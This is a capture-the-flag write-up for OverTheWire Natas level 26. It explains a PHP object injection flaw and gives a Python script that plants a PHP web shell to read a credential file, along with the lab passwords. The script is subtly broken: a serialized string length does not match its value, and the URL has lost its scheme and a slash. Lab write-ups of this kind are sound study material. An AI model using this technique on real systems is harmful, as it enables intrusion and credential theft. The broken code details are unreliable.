# Natas 25 - Natas 26
    Username  : natas26
    Password  : cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
    URL       : http://natas26.natas.labs.overthewire.org

# Solution
This level involves PHP object injection. Looking at the source code:
```
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __destruct(){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}
```

The Logger class writes $exitMsg to $logFile when destroyed. The application unserializes the cookie:

```
if(array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
}
```

We can craft a malicious Logger object that writes PHP code to a web-accessible file.

Python script : 
```
import requests
import base64

url = "[natas26.natas.labs.overthewire.org](http://natas26.natas.labs.overthewire.org/)"
auth = ("natas26", "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE")

payload = 'O:6:"Logger":3:{s:15:"\x00Logger\x00logFile";s:14:"img/shell.php";s:15:"\x00Logger\x00initMsg";s:0:"";s:15:"\x00Logger\x00exitMsg";s:63:"<?php echo file_get_contents(\'/etc/natas_webpass/natas27\'); ?>";}'

encoded = base64.b64encode(payload.encode('latin-1')).decode()

cookies = {"drawing": encoded}
r = requests.get(url, auth=auth, cookies=cookies)

r = requests.get(url + "img/shell.php", auth=auth)
print(r.text)
```

# Password 
     u3RRffXjysjgwFU6b9xa23i6prmUsYne
